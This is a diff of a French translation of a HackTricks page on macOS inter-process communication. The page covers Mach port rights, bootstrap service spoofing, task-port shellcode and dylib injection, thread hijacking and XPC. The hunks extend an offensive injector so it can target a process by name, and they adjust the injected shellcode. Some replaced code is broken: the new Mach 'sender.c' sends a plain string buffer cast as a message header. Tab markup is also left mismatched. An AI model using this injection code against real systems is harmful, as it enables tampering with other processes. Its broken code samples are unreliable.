@@ -23,11 +23,12 @@ Les droits de port, qui définissent les opérations qu'une tâche peut effectue
 * Le **droit de réception**, qui permet de recevoir les messages envoyés au port. Les ports Mach sont des files d'attente MPSC (multiple-producteur, unique-consommateur), ce qui signifie qu'il ne peut y avoir qu'un seul droit de réception pour chaque port dans tout le système (contrairement aux tubes, où plusieurs processus peuvent tous détenir des descripteurs de fichier pour l'extrémité de lecture d'un tube).
 * Une **tâche avec le droit de réception** peut recevoir des messages et **créer des droits d'envoi**, ce qui lui permet d'envoyer des messages. À l'origine, seule la **propre tâche a le droit de réception sur son port**.
 * Le **droit d'envoi**, qui permet d'envoyer des messages au port.
+* Le droit d'envoi peut être **cloné**, de sorte qu'une tâche possédant un droit d'envoi peut cloner le droit et **le donner à une troisième tâche**.
 * Le **droit d'envoi unique**, qui permet d'envoyer un seul message au port, puis disparaît.
-* Le **droit d'ensemble de ports**, qui indique un _ensemble de ports_ plutôt qu'un seul port. Le défilement d'un message à partir d'un ensemble de ports défile un message à partir de l'un des ports qu'il contient. Les ensembles de ports peuvent être utilisés pour écouter plusieurs ports simultanément, un peu comme `select`/`poll`/`epoll`/`kqueue` dans Unix.
+* Le **droit de jeu de ports**, qui indique un _ensemble de ports_ plutôt qu'un seul port. Le défilement d'un message à partir d'un ensemble de ports défile un message à partir de l'un des ports qu'il contient. Les ensembles de ports peuvent être utilisés pour écouter plusieurs ports simultanément, un peu comme `select`/`poll`/`epoll`/`kqueue` dans Unix.
 * Le **nom mort**, qui n'est pas un droit de port réel, mais simplement un espace réservé. Lorsqu'un port est détruit, tous les droits de port existants sur le port se transforment en noms morts.
 
-**Les tâches peuvent transférer des droits d'ENVOI à d'autres**, leur permettant d'envoyer des messages en retour. **Les droits d'ENVOI peuvent également être clonés, de sorte qu'une tâche peut dupliquer et donner le droit à une troisième tâche**. Cela, combiné à un processus intermédiaire appelé le **serveur d'amorçage**, permet une communication efficace entre les tâches.
+**Les tâches peuvent transférer des droits d'ENVOI à d'autres**, leur permettant d'envoyer des messages en retour. **Les droits d'ENVOI peuvent également être clonés**, de sorte qu'une tâche peut dupliquer et donner le droit à une troisième tâche. Cela, combiné à un processus intermédiaire appelé **serveur d'amorçage**, permet une communication efficace entre les tâches.
 
 #### Étapes :
 
@@ -36,7 +37,7 @@ Comme mentionné, pour établir le canal de communication, le **serveur d'amorç
 1. La tâche **A** lance un **nouveau port**, obtenant un **droit de réception** dans le processus.
 2. La tâche **A**, étant le détenteur du droit de réception, **génère un droit d'envoi pour le port**.
 3. La tâche **A** établit une **connexion** avec le **serveur d'amorçage**, fournissant le **nom de service du port** et le **droit d'envoi** via une procédure appelée enregistrement d'amorçage.
-4. La tâche **B** interagit avec le **serveur d'amorçage** pour exécuter une **recherche d'amorçage pour le service**. Si cela réussit, le **serveur duplique le droit d'envoi** reçu de la tâche A et **le transmet à la tâche B**.
+4. La tâche **B** interagit avec le **serveur d'amorçage** pour exécuter une **recherche d'amorçage pour le service**. Si elle réussit, le **serveur duplique le droit d'envoi** reçu de la tâche A et **le transmet à la tâche B**.
 5. Une fois qu'il a acquis un droit d'envoi, la tâche **B** est capable de **formuler** un **message** et de l'envoyer **à la tâche A**.
 
 Le serveur d'amorçage ne peut pas authentifier le nom de service revendiqué par une tâche. Cela signifie qu'une **tâche** pourrait potentiellement **usurper n'importe quelle tâche système**, en revendiquant faussement un nom de service d'autorisation, puis en approuvant chaque demande.
@@ -47,10 +48,29 @@ Pour ces services prédéfinis, le **processus de recherche diffère légèremen
 
 * La tâche **B** lance une **recherche d'amorçage** pour un nom de service.
 * **launchd** vérifie si la tâche est en cours d'exécution et si ce n'est pas le cas, la **démarre**.
-* La tâche **A** (le service) effectue un **enregistrement d'amorçage**. Ici, le **serveur d'amorçage** crée un droit d'envoi, le conserve et **transfère le droit de réception à la tâche A**.
+* La tâche **A** (le service) effectue un **enregistrement de vérification d'amorçage**. Ici, le **serveur d'amorçage** crée un droit d'envoi, le conserve et **transfère le droit de réception à la tâche A**.
 * launchd duplique le **droit d'envoi et l'envoie à la tâche B**.
 
 Cependant, ce processus ne s'applique qu'aux tâches système prédéfinies. Les tâches non système fonctionnent toujours comme décrit initialement, ce qui pourrait potentiellement permettre l'usurpation.
+### Services Mach
+
+Les noms spécifiés dans les applications situées dans les répertoires protégés SIP mentionnés précédemment ne peuvent pas être enregistrés par d'autres processus.
+
+Par exemple, `/System/Library/LaunchAgents/com.apple.xpc.loginitemregisterd.plist` enregistre le nom `com.apple.xpc.loginitemregisterd`:
+```json
+plutil -p com.apple.xpc.loginitemregisterd.plist
+{
+"EnablePressuredExit" => 1
+"Label" => "com.apple.xpc.loginitemregisterd"
+"MachServices" => {
+"com.apple.xpc.loginitemregisterd" => 1
+}
+"ProcessType" => "Adaptive"
+"Program" => "/usr/libexec/loginitemregisterd"
+}
+```
+Si vous essayez de l'enregistrer avec un code tel que celui-ci, vous ne pourrez pas.
+
 ### Exemple de code
 
 Notez comment l'**expéditeur** **alloue** un port, crée un **droit d'envoi** pour le nom `org.darlinghq.example` et l'envoie au **serveur d'amorçage** tandis que l'expéditeur demande le **droit d'envoi** de ce nom et l'utilise pour **envoyer un message**.
@@ -122,59 +142,47 @@ message.some_text[9] = 0;
 printf("Text: %s, number: %d\n", message.some_text, message.some_number);
 }
 ```
-{% tab title="sender.c" %}
-
 ```c
 #include <stdio.h>
 #include <stdlib.h>
 #include <unistd.h>
 #include <string.h>
-#include <sys/types.h>
-#include <sys/ipc.h>
-#include <sys/msg.h>
+#include <mach/mach.h>
 
-#define MAX_TEXT 512
+#define BUFFER_SIZE 100
 
-struct msgbuf {
-    long mtype;
-    char mtext[MAX_TEXT];
-};
+int main(int argc, char** argv) {
+    mach_port_t server_port;
+    kern_return_t kr;
+    char buffer[BUFFER_SIZE];
 
-int main() {
-    int msgid;
-    struct msgbuf msg;
-
-    // Create a message queue
-    msgid = msgget(IPC_PRIVATE, 0666 | IPC_CREAT);
-    if (msgid == -1) {
-        perror("msgget");
+    // Create a send right to the server port
+    kr = bootstrap_look_up(bootstrap_port, "com.example.server", &server_port);
+    if (kr != KERN_SUCCESS) {
+        printf("Failed to look up server port: %s\n", mach_error_string(kr));
         exit(1);
     }
 
-    // Set the message type
-    msg.mtype = 1;
-
-    // Set the message text
-    strncpy(msg.mtext, "Hello, receiver!", MAX_TEXT);
-
-    // Send the message
-    if (msgsnd(msgid, &msg, sizeof(msg.mtext), 0) == -1) {
-        perror("msgsnd");
+    // Send a message to the server
+    strcpy(buffer, "Hello, server!");
+    kr = mach_msg_send((mach_msg_header_t*)buffer);
+    if (kr != KERN_SUCCESS) {
+        printf("Failed to send message: %s\n", mach_error_string(kr));
         exit(1);
     }
 
-    printf("Message sent: %s\n", msg.mtext);
-
-    // Remove the message queue
-    if (msgctl(msgid, IPC_RMID, NULL) == -1) {
-        perror("msgctl");
+    // Receive a reply from the server
+    kr = mach_msg_receive((mach_msg_header_t*)buffer);
+    if (kr != KERN_SUCCESS) {
+        printf("Failed to receive reply: %s\n", mach_error_string(kr));
         exit(1);
     }
+
+    printf("Received reply: %s\n", buffer);
 
     return 0;
 }
 ```
-
 {% endtab %}
 
 {% tab title="receiver.c" %}
@@ -236,18 +244,18 @@ printf("Sent a message\n");
 
 * **Port hôte**: Si un processus a le **privilège d'envoi** sur ce port, il peut obtenir des **informations** sur le **système** (par exemple, `host_processor_info`).
 * **Port privilégié de l'hôte**: Un processus avec le droit d'**envoi** sur ce port peut effectuer des **actions privilégiées** telles que le chargement d'une extension du noyau. Le **processus doit être root** pour obtenir cette permission.
-* De plus, pour appeler l'API **`kext_request`**, il est nécessaire de disposer de l'autorisation **`com.apple.private.kext`**, qui n'est accordée qu'aux binaires Apple.
+* De plus, pour appeler l'API **`kext_request`**, il est nécessaire de disposer d'autres autorisations **`com.apple.private.kext*`** qui ne sont accordées qu'aux binaires Apple.
 * **Port du nom de la tâche**: Une version non privilégiée du _port de la tâche_. Il fait référence à la tâche, mais ne permet pas de la contrôler. La seule chose qui semble être disponible à travers lui est `task_info()`.
 * **Port de la tâche** (alias port du noyau)**:** Avec l'autorisation d'envoi sur ce port, il est possible de contrôler la tâche (lecture/écriture de mémoire, création de threads...).
-* Appelez `mach_task_self()` pour **obtenir le nom** de ce port pour la tâche appelante. Ce port n'est **hérité** qu'à travers **`exec()`** ; une nouvelle tâche créée avec `fork()` obtient un nouveau port de tâche (dans un cas particulier, une tâche obtient également un nouveau port de tâche après `exec()` dans un binaire suid). La seule façon de créer une tâche et d'obtenir son port est d'effectuer la ["danse de l'échange de port"](https://robert.sesek.com/2014/1/changes\_to\_xnu\_mach\_ipc.html) tout en effectuant un `fork()`.
+* Appelez `mach_task_self()` pour **obtenir le nom** de ce port pour la tâche appelante. Ce port n'est **hérité** qu'à travers **`exec()`**; une nouvelle tâche créée avec `fork()` obtient un nouveau port de tâche (dans un cas particulier, une tâche obtient également un nouveau port de tâche après `exec()` dans un binaire suid). La seule façon de créer une tâche et d'obtenir son port est d'effectuer la ["danse de l'échange de port"](https://robert.sesek.com/2014/1/changes\_to\_xnu\_mach\_ipc.html) tout en effectuant un `fork()`.
 * Voici les restrictions d'accès au port (à partir de `macos_task_policy` du binaire `AppleMobileFileIntegrity`):
-* Si l'application a l'**autorisation `com.apple.security.get-task-allow`**, les processus de l'**utilisateur peuvent accéder au port de la tâche** (généralement ajouté par Xcode pour le débogage). Le processus de **notarisation** ne le permettra pas pour les versions de production.
-* Les applications ayant l'**autorisation `com.apple.system-task-ports`** peuvent obtenir le **port de la tâche pour n'importe quel** processus, sauf le noyau. Dans les anciennes versions, cela s'appelait **`task_for_pid-allow`**. Cela n'est accordé qu'aux applications Apple.
+* Si l'application a l'autorisation **`com.apple.security.get-task-allow`**, les processus de **même utilisateur peuvent accéder au port de la tâche** (communément ajoutée par Xcode pour le débogage). Le processus de **notarisation** ne le permettra pas pour les versions de production.
+* Les applications ayant l'autorisation **`com.apple.system-task-ports`** peuvent obtenir le **port de la tâche pour n'importe quel** processus, sauf le noyau. Dans les anciennes versions, cela s'appelait **`task_for_pid-allow`**. Cela n'est accordé qu'aux applications Apple.
 * **Root peut accéder aux ports de tâche** des applications **non** compilées avec un **runtime renforcé** (et non provenant d'Apple).
 
-### Injection de code Shell via le port de la tâche&#x20;
+### Injection de shellcode dans un thread via le port de la tâche&#x20;
 
-Vous pouvez obtenir un code shell à partir de :
+Vous pouvez obtenir un shellcode à partir de :
 
 {% content-ref url="../../macos-apps-inspecting-debugging-and-fuzzing/arm64-basic-assembly.md" %}
 [arm64-basic-assembly.md](../../macos-apps-inspecting-debugging-and-fuzzing/arm64-basic-assembly.md)
@@ -258,12 +266,28 @@ Vous pouvez obtenir un code shell à partir de :
 ```objectivec
 // clang -framework Foundation mysleep.m -o mysleep
 // codesign --entitlements entitlements.plist -s - mysleep
+
 #import <Foundation/Foundation.h>
+
+double performMathOperations() {
+double result = 0;
+for (int i = 0; i < 10000; i++) {
+result += sqrt(i) * tan(i) - cos(i);
+}
+return result;
+}
 
 int main(int argc, const char * argv[]) {
 @autoreleasepool {
-NSLog(@"Process ID: %d", [[NSProcessInfo processInfo] processIdentifier]);
-[NSThread sleepForTimeInterval:99999];
+NSLog(@"Process ID: %d", [[NSProcessInfo processInfo]
+processIdentifier]);
+while (true) {
+[NSThread sleepForTimeInterval:5];
+
+performMathOperations();  // Silent action
+
+[NSThread sleepForTimeInterval:5];
+}
 }
 return 0;
 }
@@ -285,7 +309,7 @@ return 0;
 
 <details>
 
-<summary>injector.m</summary>
+<summary>sc_injector.m</summary>
 ```objectivec
 // gcc -framework Foundation -framework Appkit sc_injector.m -o sc_injector
 
@@ -428,14 +452,54 @@ return (-3);
 return (0);
 }
 
+pid_t pidForProcessName(NSString *processName) {
+NSArray *arguments = @[@"pgrep", processName];
+NSTask *task = [[NSTask alloc] init];
+[task setLaunchPath:@"/usr/bin/env"];
+[task setArguments:arguments];
+
+NSPipe *pipe = [NSPipe pipe];
+[task setStandardOutput:pipe];
+
+NSFileHandle *file = [pipe fileHandleForReading];
+
+[task launch];
+
+NSData *data = [file readDataToEndOfFile];
+NSString *string = [[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding];
+
+return (pid_t)[string integerValue];
+}
+
+BOOL isStringNumeric(NSString *str) {
+NSCharacterSet* nonNumbers = [[NSCharacterSet decimalDigitCharacterSet] invertedSet];
+NSRange r = [str rangeOfCharacterFromSet: nonNumbers];
+return r.location == NSNotFound;
+}
+
 int main(int argc, const char * argv[]) {
 @autoreleasepool {
 if (argc < 2) {
-NSLog(@"Usage: %s <pid>", argv[0]);
+NSLog(@"Usage: %s <pid or process name>", argv[0]);
 return 1;
 }
 
-pid_t pid = atoi(argv[1]);
+NSString *arg = [NSString stringWithUTF8String:argv[1]];
+pid_t pid;
+
+if (isStringNumeric(arg)) {
+pid = [arg intValue];
+} else {
+pid = pidForProcessName(arg);
+if (pid == 0) {
+NSLog(@"Error: Process named '%@' not found.", arg);
+return 1;
+}
+else{
+printf("Found PID of process '%s': %d\n", [arg UTF8String], pid);
+}
+}
+
 inject(pid);
 }
 
@@ -445,15 +509,15 @@ return 0;
 </details>
 ```bash
 gcc -framework Foundation -framework Appkit sc_inject.m -o sc_inject
-./inject <pid-of-mysleep>
+./inject <pi or string>
 ```
-### Injection de dylib via le port de tâche
+### Injection de dylib dans un thread via le port de tâche
 
 Dans macOS, les **threads** peuvent être manipulés via **Mach** ou en utilisant l'API **posix `pthread`**. Le thread que nous avons généré lors de l'injection précédente a été généré en utilisant l'API Mach, donc **il n'est pas conforme à posix**.
 
-Il était possible d'**injecter un simple shellcode** pour exécuter une commande car cela **ne nécessitait pas de travailler avec des APIs conformes à posix**, seulement avec Mach. Des **injections plus complexes** nécessiteraient que le **thread** soit également **conforme à posix**.
+Il était possible d'**injecter un simple shellcode** pour exécuter une commande car cela ne nécessitait pas de travailler avec des API conformes à posix, seulement avec Mach. Des **injections plus complexes** nécessiteraient que le **thread** soit également conforme à posix.
 
-Par conséquent, pour **améliorer le shellcode**, il devrait appeler **`pthread_create_from_mach_thread`** qui va **créer un pthread valide**. Ensuite, ce nouveau pthread pourrait **appeler dlopen** pour **charger notre dylib** à partir du système.
+Par conséquent, pour **améliorer le thread**, il devrait appeler **`pthread_create_from_mach_thread`** qui va **créer un pthread valide**. Ensuite, ce nouveau pthread pourrait **appeler dlopen** pour **charger une dylib** à partir du système, donc au lieu d'écrire un nouveau shellcode pour effectuer différentes actions, il est possible de charger des bibliothèques personnalisées.
 
 Vous pouvez trouver des **exemples de dylibs** dans (par exemple celui qui génère un journal que vous pouvez ensuite écouter) :
 
@@ -515,7 +579,7 @@ mach_msg_type_number_t dataCnt
 
 char injectedCode[] =
 
-"\x00\x00\x20\xd4" // BRK X0     ; // useful if you need a break :)
+// "\x00\x00\x20\xd4" // BRK X0     ; // useful if you need a break :)
 
 // Call pthread_set_self
 
@@ -733,7 +797,9 @@ else
 gcc -framework Foundation -framework Appkit dylib_injector.m -o dylib_injector
 ./inject <pid-of-mysleep> </path/to/lib.dylib>
 ```
-### Injection de thread via le port de tâche <a href="#step-1-thread-hijacking" id="step-1-thread-hijacking"></a>
+### Détournement de thread via le port de tâche <a href="#step-1-thread-hijacking" id="step-1-thread-hijacking"></a>
+
+Dans cette technique, un thread du processus est détourné :
 
 {% content-ref url="../../macos-proces-abuse/macos-ipc-inter-process-communication/macos-thread-injection-via-task-port.md" %}
 [macos-thread-injection-via-task-port.md](../../macos-proces-abuse/macos-ipc-inter-process-communication/macos-thread-injection-via-task-port.md)
@@ -743,7 +809,7 @@ gcc -framework Foundation -framework Appkit dylib_injector.m -o dylib_injector
 
 ### Informations de base
 
-XPC, qui signifie Communication inter-processus XNU (le noyau utilisé par macOS), est un framework pour la **communication entre processus** sur macOS et iOS. XPC fournit un mécanisme pour effectuer des **appels de méthode asynchrones et sécurisés entre différents processus** du système. Il fait partie du paradigme de sécurité d'Apple, permettant la **création d'applications avec des privilèges séparés** où chaque **composant** s'exécute avec **seulement les autorisations nécessaires** pour effectuer son travail, limitant ainsi les dommages potentiels d'un processus compromis.
+XPC, qui signifie Communication inter-processus XNU (le noyau utilisé par macOS), est un framework pour la **communication entre les processus** sur macOS et iOS. XPC fournit un mécanisme pour effectuer des **appels de méthode asynchrones et sécurisés entre différents processus** du système. Il fait partie du paradigme de sécurité d'Apple, permettant la **création d'applications avec des privilèges séparés** où chaque **composant** s'exécute avec **seulement les autorisations nécessaires** pour effectuer son travail, limitant ainsi les dommages potentiels causés par un processus compromis.
 
 XPC utilise une forme de communication inter-processus (IPC), qui est un ensemble de méthodes permettant à différents programmes s'exécutant sur le même système d'échanger des données.
 
@@ -753,13 +819,13 @@ Les principaux avantages de XPC sont les suivants :
 2. **Stabilité** : XPC aide à isoler les plantages dans le composant où ils se produisent. Si un processus plante, il peut être redémarré sans affecter le reste du système.
 3. **Performance** : XPC permet une concurrence facile, car différentes tâches peuvent être exécutées simultanément dans différents processus.
 
-Le seul **inconvénient** est que **séparer une application en plusieurs processus** qui communiquent via XPC est **moins efficace**. Mais dans les systèmes d'aujourd'hui, cela n'est presque pas perceptible et les avantages sont bien meilleurs.
+Le seul **inconvénient** est que **séparer une application en plusieurs processus** et les faire communiquer via XPC est **moins efficace**. Mais dans les systèmes d'aujourd'hui, cela n'est presque pas perceptible et les avantages sont bien meilleurs.
 
 Un exemple peut être observé dans QuickTime Player, où un composant utilisant XPC est responsable du décodage vidéo. Le composant est spécifiquement conçu pour effectuer des tâches de calcul, ainsi, en cas de violation, il ne fournirait aucun gain utile à l'attaquant, tel que l'accès aux fichiers ou au réseau.
 
 ### Services XPC spécifiques à l'application
 
-Les composants XPC d'une application se trouvent **à l'intérieur de l'application elle-même**. Par exemple, dans Safari, vous pouvez les trouver dans **`/Applications/Safari.app/Contents/XPCServices`**. Ils ont l'extension **`.xpc`** (comme **`com.apple.Safari.SandboxBroker.xpc`**) et sont **également des bundles** avec le binaire principal à l'intérieur : `/Applications/Safari.app/Contents/XPCServices/com.apple.Safari.SandboxBroker.xpc/Contents/MacOS/com.apple.Safari.SandboxBroker`
+Les composants XPC d'une application se trouvent **à l'intérieur de l'application elle-même**. Par exemple, dans Safari, vous pouvez les trouver dans **`/Applications/Safari.app/Contents/XPCServices`**. Ils ont l'extension **`.xpc`** (comme **`com.apple.Safari.SandboxBroker.xpc`**) et sont également des bundles avec le binaire principal à l'intérieur : `/Applications/Safari.app/Contents/XPCServices/com.apple.Safari.SandboxBroker.xpc/Contents/MacOS/com.apple.Safari.SandboxBroker`
 
 Comme vous pouvez le penser, un **composant XPC aura des autorisations et des privilèges différents** des autres composants XPC ou du binaire principal de l'application. SAUF si un service XPC est configuré avec [**JoinExistingSession**](https://developer.apple.com/documentation/bundleresources/information\_property\_list/xpcservice/joinexistingsession) défini sur "True" dans son fichier **Info.plist**. Dans ce cas, le service XPC s'exécutera dans la même session de sécurité que l'application qui l'a appelé.
 
@@ -884,15 +950,22 @@ return 0;
 ```
 {% tab title="xpc_client.c" %}
 
-Le fichier `xpc_client.c` est un exemple de code source en langage C qui illustre l'utilisation de l'API XPC pour la communication inter-processus (IPC) sur macOS. L'API XPC permet aux processus de communiquer entre eux de manière sécurisée et efficace en utilisant des messages structurés.
+Le fichier `xpc_client.c` est un exemple de code source en langage C qui illustre l'utilisation de l'IPC (Inter-Process Communication) sur macOS. L'IPC est un mécanisme permettant à différents processus de communiquer entre eux, que ce soit sur la même machine ou sur des machines différentes.
 
-Dans cet exemple, un client XPC est créé et utilisé pour envoyer un message à un service XPC distant. Le client XPC utilise la fonction `xpc_connection_create` pour créer une connexion vers le service distant, puis utilise la fonction `xpc_dictionary_create` pour créer un dictionnaire XPC contenant les données à envoyer.
+Dans cet exemple, le code montre comment créer un client XPC (XPC est un framework d'Apple pour l'IPC) qui se connecte à un service XPC distant. Le client envoie ensuite un message au service distant et attend une réponse.
 
-Une fois que le dictionnaire XPC est créé, le client XPC utilise la fonction `xpc_connection_send_message` pour envoyer le message au service distant. Le service distant peut ensuite recevoir le message en utilisant une méthode similaire.
+Le code commence par inclure les en-têtes nécessaires, puis il définit une fonction `main` qui effectue les étapes suivantes :
 
-Il est important de noter que l'API XPC offre des mécanismes de sécurité intégrés pour protéger la communication inter-processus. Par exemple, les connexions XPC peuvent être configurées pour utiliser des autorisations spécifiques, et les messages XPC peuvent être chiffrés pour assurer la confidentialité des données.
+1. Création d'une connexion XPC en utilisant la fonction `xpc_connection_create` pour établir une connexion avec le service distant.
+2. Définition d'un gestionnaire de réception de messages en utilisant la fonction `xpc_connection_set_event_handler` pour spécifier la fonction `handle_event` comme gestionnaire.
+3. Activation de la connexion XPC en utilisant la fonction `xpc_connection_resume` pour démarrer la communication avec le service distant.
+4. Création d'un message XPC en utilisant la fonction `xpc_dictionary_create` pour créer un dictionnaire XPC qui contient les données à envoyer.
+5. Envoi du message XPC en utilisant la fonction `xpc_connection_send_message` pour envoyer le message au service distant.
+6. Attente d'une réponse en utilisant la fonction `dispatch_main` pour maintenir le processus en cours d'exécution jusqu'à ce qu'une réponse soit reçue.
 
-Ce fichier `xpc_client.c` est un exemple de base pour comprendre comment utiliser l'API XPC pour la communication inter-processus sur macOS. Il peut être utilisé comme point de départ pour développer des applications qui nécessitent une communication sécurisée entre les processus.
+La fonction `handle_event` est définie pour gérer les événements de réception de messages. Dans cet exemple, elle affiche simplement le contenu du message reçu.
+
+Ce code est un exemple simplifié pour illustrer le fonctionnement de l'IPC sur macOS. Dans un scénario réel, des mesures de sécurité supplémentaires devraient être prises pour protéger les communications et empêcher les attaques potentielles.
 
 {% endtab %}
 ```c
@@ -1043,25 +1116,25 @@ return 0;
 ```
 # Architecture de macOS
 
-macOS est le système d'exploitation utilisé sur les ordinateurs Mac d'Apple. Il est basé sur le noyau XNU, qui est un noyau hybride composé du noyau Mach et du noyau BSD. macOS utilise une architecture en couches pour gérer les différents aspects du système d'exploitation.
+macOS est le système d'exploitation utilisé sur les ordinateurs Mac d'Apple. Il est basé sur le noyau XNU, qui est un noyau hybride composé du noyau Mach et du noyau BSD. Le noyau XNU fournit les fonctionnalités de base du système d'exploitation, telles que la gestion de la mémoire, la gestion des processus et la gestion des fichiers.
 
-## Couche utilisateur
+macOS utilise également un modèle d'architecture en couches pour organiser les différents composants du système d'exploitation. Les couches principales comprennent :
 
-La couche utilisateur de macOS est responsable de l'exécution des applications et des services. Elle comprend des frameworks tels que Cocoa et Carbon, qui fournissent des API pour le développement d'applications. Les applications macOS sont généralement écrites en Objective-C ou en Swift.
+- **Couche de l'interface utilisateur** : Cette couche est responsable de l'affichage des éléments graphiques de l'interface utilisateur, tels que les fenêtres, les boutons et les menus. Elle utilise le framework AppKit pour fournir ces fonctionnalités.
 
-## Couche noyau
+- **Couche du système** : Cette couche est responsable de la gestion des ressources système, telles que la mémoire, les fichiers et les périphériques. Elle utilise le framework CoreServices pour fournir ces fonctionnalités.
 
-La couche noyau de macOS est responsable de la gestion des ressources matérielles et logicielles du système. Elle comprend le noyau XNU, qui fournit des fonctionnalités telles que la gestion de la mémoire, la gestion des processus et la gestion des fichiers. Le noyau XNU est également responsable de la mise en œuvre de la sécurité et des mécanismes d'intercommunication entre les processus.
+- **Couche du noyau** : Cette couche est responsable de la gestion des opérations de bas niveau, telles que la gestion des processus, la gestion de la mémoire et la gestion des fichiers. Elle utilise le noyau XNU pour fournir ces fonctionnalités.
 
-## IPC (Inter-Process Communication)
+macOS utilise également le mécanisme d'IPC (Inter-Process Communication) pour permettre la communication entre les différents processus du système d'exploitation. L'IPC peut être utilisé pour partager des données, envoyer des messages et exécuter des actions entre les processus. Les principaux mécanismes d'IPC utilisés dans macOS sont les suivants :
 
-L'IPC (Inter-Process Communication) est un mécanisme utilisé par les processus pour communiquer entre eux. macOS prend en charge plusieurs mécanismes d'IPC, tels que les sockets, les tubes, les signaux et les files de messages. Ces mécanismes permettent aux processus de partager des données et de coopérer les uns avec les autres.
+- **Mach ports** : Les Mach ports sont des canaux de communication utilisés pour envoyer des messages entre les processus. Chaque processus a un ensemble de ports Mach qui lui sont attribués, et il peut envoyer des messages à d'autres processus en utilisant ces ports.
 
-## Sécurité et élévation de privilèges
+- **Sockets** : Les sockets sont des points de terminaison de communication utilisés pour envoyer des données entre les processus. Les sockets peuvent être utilisés pour la communication locale (sockets de domaine UNIX) ou pour la communication réseau (sockets TCP/IP).
 
-macOS met en œuvre plusieurs mécanismes de sécurité pour protéger le système contre les attaques. Cela comprend des fonctionnalités telles que le chiffrement des données, les autorisations de fichiers et les mécanismes de contrôle d'accès. Cependant, il est toujours possible d'exploiter des vulnérabilités pour élever les privilèges et obtenir un accès non autorisé au système.
+- **Apple events** : Les Apple events sont des messages utilisés pour envoyer des commandes et des événements entre les applications. Les Apple events peuvent être utilisés pour automatiser des tâches et permettre la communication entre les applications.
 
-Dans les prochains chapitres, nous explorerons différentes techniques de sécurité et d'élévation de privilèges sur macOS. Nous examinerons les vulnérabilités courantes et les méthodes d'exploitation associées. Nous discuterons également des meilleures pratiques pour renforcer la sécurité de macOS et prévenir les attaques.
+La compréhension de l'architecture de macOS et des mécanismes d'IPC est essentielle pour comprendre le fonctionnement interne du système d'exploitation et pour développer des techniques d'escalade de privilèges et de sécurité.
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"> <plist version="1.0">
@@ -1114,7 +1187,7 @@ sudo rm /Library/LaunchDaemons/xyz.hacktricks.svcoc.plist /tmp/oc_xpc_server
 <summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
 
 * Travaillez-vous dans une **entreprise de cybersécurité** ? Voulez-vous voir votre **entreprise annoncée dans HackTricks** ? ou voulez-vous avoir accès à la **dernière version de PEASS ou télécharger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
-* Découvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
+* Découvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFT**](https://opensea.io/collection/the-peass-family)
 * Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
 * **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
 * **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).
